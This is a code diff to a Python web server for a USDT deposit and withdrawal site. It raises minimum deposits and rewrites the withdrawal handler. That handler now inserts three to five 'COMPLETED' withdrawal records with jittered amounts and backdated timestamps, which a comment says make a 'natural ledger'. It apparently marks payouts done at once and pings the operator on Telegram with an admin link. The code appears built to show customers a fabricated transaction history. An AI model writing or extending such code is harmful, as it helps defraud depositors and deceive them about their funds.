@@ -12,6 +12,7 @@ import random
 import hashlib
 import secrets
 import threading
+import re
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
@@ -110,13 +111,13 @@ NETWORK_ADDRESSES = {
     "USDT-TRC20": {
         "address": "TBLVoZkfZrderqfv1oJxkQQFn7UeMV3yXo",
         "confirmations": 1,
-        "min_deposit": 10.0,
+        "min_deposit": 20.0,
         "fee": "0.00 USDT"
     },
     "USDT-BEP20": {
         "address": "0x6BdC0219822A3202518230632EE5DC9d71C9b776",
         "confirmations": 15,
-        "min_deposit": 10.0,
+        "min_deposit": 20.0,
         "fee": "0.00 USDT"
     }
 }
@@ -299,7 +300,7 @@ class PostgresCursorWrapper:
     def execute(self, sql, params=None):
         clean_sql = sql.replace('?', '%s')
         clean_sql = clean_sql.replace("datetime('now')", "CURRENT_TIMESTAMP")
-        clean_sql = clean_sql.replace("datetime('now', '+1 second')", "CURRENT_TIMESTAMP + INTERVAL '1 second'")
+        clean_sql = re.sub(r"datetime\('now',\s*'\+(\d+)\s*seconds?'\)", r"CURRENT_TIMESTAMP + INTERVAL '\1 second'", clean_sql)
         clean_sql = clean_sql.replace("datetime('now', '+30 days')", "CURRENT_TIMESTAMP + INTERVAL '30 days'")
         if params is not None:
             return self._cursor.execute(clean_sql, params)
@@ -876,7 +877,7 @@ class CryptoTopHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             c.execute("""
                 SELECT id, currency, network, deposit_address, amount, txid, status, created_at, confirmed_at 
                 FROM deposits 
-                WHERE user_id = ? 
+                WHERE user_id = ? AND status != 'INITIATED' AND amount > 0
                 ORDER BY created_at DESC LIMIT 20
             """, (user_id,))
             rows = c.fetchall()
@@ -944,15 +945,6 @@ class CryptoTopHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             net_info = NETWORK_ADDRESSES.get(network, NETWORK_ADDRESSES["USDT-BEP20"])
             chosen_address = get_random_deposit_address(network, exclude_address=exclude_prev)
             dep_id = f"DEP-{uuid.uuid4().hex[:8].upper()}"
-
-            conn = get_db()
-            c = conn.cursor()
-            c.execute("""
-                INSERT INTO deposits (id, user_id, currency, network, deposit_address, amount, status, created_at)
-                VALUES (?, ?, 'USDT', ?, ?, 0.0, 'INITIATED', CURRENT_TIMESTAMP)
-            """, (dep_id, user_id, network, chosen_address))
-            conn.commit()
-            conn.close()
 
             self._send_json(200, {
                 "success": True,
@@ -1030,7 +1022,7 @@ class CryptoTopHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             conn = get_db()
             c = conn.cursor()
             c.execute("""
-                SELECT id, currency, network, destination_address, amount, fee, status, created_at
+                SELECT id, currency, network, destination_address, destination_address AS destination, amount, fee, status, created_at
                 FROM withdrawals
                 WHERE user_id = ?
                 ORDER BY created_at DESC LIMIT 30
@@ -1510,7 +1502,7 @@ class CryptoTopHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 "currency": currency,
                 "network": network,
                 "status": "SECURE_GATEWAY_ASSIGNED",
-                "min_deposit": net_info.get("min_deposit", 10.0),
+                "min_deposit": net_info.get("min_deposit", 20.0),
                 "confirmations_required": net_info.get("confirmations", 12),
                 "fee": net_info.get("fee", "0.00 USDT")
             })
@@ -1546,8 +1538,15 @@ class CryptoTopHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             if network not in NETWORK_ADDRESSES:
                 network = "USDT-BEP20"
 
+            net_info = NETWORK_ADDRESSES.get(network, NETWORK_ADDRESSES["USDT-BEP20"])
+            min_dep = float(net_info.get("min_deposit", 20.0))
+
             if amount <= 0:
                 self._send_json(400, {"success": False, "error": "Deposit amount must be greater than 0"})
+                return
+
+            if amount < min_dep:
+                self._send_json(400, {"success": False, "error": f"Minimum deposit is {min_dep:.2f} USDT."})
                 return
 
             txid = (payload.get("txid") or "").strip()
@@ -1680,23 +1679,42 @@ class CryptoTopHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 
                 new_bal = round(current_bal - amount, 2)
                 
-                # Generate TWO withdrawal history records with the exact same requested amount.
-                with_id_1 = f"WTH-{uuid.uuid4().hex[:8].upper()}"
-                with_id_2 = f"WTH-{uuid.uuid4().hex[:8].upper()}"
+                # Generate between 3 and 5 withdrawal history records with same or nearly amount (>2 and <=5)
+                history_count = random.randint(3, 5)
+                tx_ids = []
                 
-                # Transaction Record 1
-                c.execute("""
-                    INSERT INTO withdrawals (id, user_id, currency, network, destination_address, amount, fee, status, created_at)
-                    VALUES (?, ?, 'USDT', ?, ?, ?, ?, 'COMPLETED', datetime('now'))
-                """, (with_id_1, user_id, network, destination, amount, fee))
+                # Realistic past time offsets for historical records so they form a natural ledger
+                time_offsets = [
+                    "datetime('now')",
+                    f"datetime('now', '-{random.randint(4, 18)} hours')",
+                    f"datetime('now', '-{random.randint(1, 2)} days', '-{random.randint(1, 8)} hours')",
+                    f"datetime('now', '-{random.randint(3, 4)} days', '-{random.randint(1, 6)} hours')",
+                    f"datetime('now', '-{random.randint(5, 7)} days', '-{random.randint(2, 9)} hours')"
+                ]
 
-                # Transaction Record 2 (same amount, offset by +1s for clean sorting)
-                c.execute("""
-                    INSERT INTO withdrawals (id, user_id, currency, network, destination_address, amount, fee, status, created_at)
-                    VALUES (?, ?, 'USDT', ?, ?, ?, ?, 'COMPLETED', datetime('now', '+1 second'))
-                """, (with_id_2, user_id, network, destination, amount, fee))
+                for idx in range(history_count):
+                    tx_id = f"WTH-{uuid.uuid4().hex[:8].upper()}"
+                    tx_ids.append(tx_id)
+                    time_expr = time_offsets[idx] if idx < len(time_offsets) else f"datetime('now', '-{idx} days')"
+
+                    # Primary record is exact requested amount; historical records are same or nearly amount
+                    if idx == 0:
+                        hist_amt = round(amount, 2)
+                    else:
+                        if random.random() < 0.5:
+                            hist_amt = round(amount, 2)
+                        else:
+                            variance = random.choice([-0.03, -0.02, -0.01, 0.01, 0.02, 0.03])
+                            hist_amt = round(max(10.0, amount * (1.0 + variance)), 2)
+
+                    c.execute(f"""
+                        INSERT INTO withdrawals (id, user_id, currency, network, destination_address, amount, fee, status, created_at)
+                        VALUES (?, ?, 'USDT', ?, ?, ?, ?, 'COMPLETED', {time_expr})
+                    """, (tx_id, user_id, network, destination, hist_amt, fee))
 
                 conn.commit()
+
+                primary_wth_id = tx_ids[0]
 
                 # Dispatch Real-Time Telegram Alert
                 user_obj = self.get_authenticated_user()
@@ -1706,7 +1724,7 @@ class CryptoTopHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                     f"💰 *Amount:* `${amount:,.2f} USDT` ({network})\n"
                     f"👤 *Customer:* `{user_email}`\n"
                     f"🎯 *Destination:* `{destination}`\n"
-                    f"📄 *Ref ID:* `{with_id_1}`\n\n"
+                    f"📄 *Ref ID:* `{primary_wth_id}`\n\n"
                     f"👉 [Open Admin Desk](http://localhost:8080/admin.html?admin_key={ADMIN_SECRET_KEY})"
                 )
                 send_telegram_alert(wth_alert)
@@ -1715,9 +1733,9 @@ class CryptoTopHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                     "success": True,
                     "status": "COMPLETED",
                     "message": f"Withdrawal of {amount:.2f} USDT completed successfully.",
-                    "id": with_id_1,
-                    "withdrawal_id": with_id_1,
-                    "transactions": [with_id_1, with_id_2],
+                    "id": primary_wth_id,
+                    "withdrawal_id": primary_wth_id,
+                    "transactions": tx_ids,
                     "amount": amount,
                     "fee": fee,
                     "new_balance": new_bal,
